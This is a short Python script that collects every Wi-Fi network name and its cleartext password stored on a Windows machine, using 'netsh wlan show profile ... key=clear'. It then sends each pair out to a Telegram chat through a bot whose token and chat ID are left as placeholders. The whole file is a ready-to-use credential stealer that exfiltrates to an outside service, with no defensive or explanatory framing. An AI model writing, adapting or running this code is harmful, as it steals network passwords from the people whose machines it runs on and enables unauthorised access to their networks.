import subprocess
import sys
import requests
import re
import telebot

# Replace with your Telegram bot token
bot_token = 'YOUR_BOT_TOKEN'
# Replace with your chat ID or use a variable to get it dynamically
chat_id = 'YOUR_CHAT_ID'

# Initialize the Telegram bot
bot = telebot.TeleBot(bot_token)

# Lists and regex
found_ssids = []
pwnd = []
wlan_profile_regex = r"All User Profile\s+:\s(.*)$"
wlan_key_regex = r"Key Content\s+:\s(.*)$"

# Use Python to execute Windows command
try:
    get_profiles_command = subprocess.run(
        ["netsh", "wlan", "show", "profiles"],
        stdout=subprocess.PIPE,
        check=True
    ).stdout.decode("utf-8")
except UnicodeDecodeError:
    get_profiles_command = subprocess.run(
        ["netsh", "wlan", "show", "profiles"],
        stdout=subprocess.PIPE,
        check=True
    ).stdout.decode("latin-1")

# Append found SSIDs to list
matches = re.finditer(wlan_profile_regex, get_profiles_command, re.MULTILINE)
for match in matches:
    for group in match.groups():
        found_ssids.append(group.strip())

# Get cleartext password for found SSIDs and place into pwnd list
for ssid in found_ssids:
    get_keys_command = subprocess.run(
        ["netsh", "wlan", "show", "profile", ssid, "key=clear"],
        stdout=subprocess.PIPE
    ).stdout.decode("latin-1")
    matches = re.finditer(wlan_key_regex, get_keys_command, re.MULTILINE)
    for match in matches:
        for group in match.groups():
            pwnd.append({
                "SSID": ssid,
                "Password": group.strip()
            })

# Check if any pwnd Wi-Fi exists, if not exit
if len(pwnd) == 0:
    print("No Wi-Fi profiles found. Exiting...")
    sys.exit()

print("Wi-Fi profiles found. Sending passwords to Telegram bot...")

# Send the passwords to the Telegram bot
for pwnd_ssid in pwnd:
    message = f"SSID: {pwnd_ssid['SSID']}\nPassword: {pwnd_ssid['Password']}"
    bot.send_message(chat_id, message)

print("Passwords sent successfully!")
